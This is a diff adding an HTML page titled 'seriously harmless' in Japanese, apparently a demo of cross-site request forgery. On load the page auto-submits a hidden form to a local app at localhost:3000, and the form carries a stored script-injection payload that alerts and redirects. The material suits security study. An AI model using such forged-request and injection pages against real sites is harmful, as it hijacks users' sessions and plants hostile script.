@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>マジで無害</title>
+    <script>
+      window.addEventListener('load', () => {
+        const f = document.forms['evil'];
+        f.action = 'http://localhost:3000/pictures';
+        f.method = 'POST';
+        f.submit();
+      });
+    </script>
+  </head>
+  <body>
+    <div>超無害</div>
+    <form name="evil" action="" method="POST">
+      <input
+        type="hidden"
+        name="picture[content]"
+        value="<script>alert('evil');this.location.href='http://google.com';</script>"
+      />
+    </form>
+  </body>
+</html>
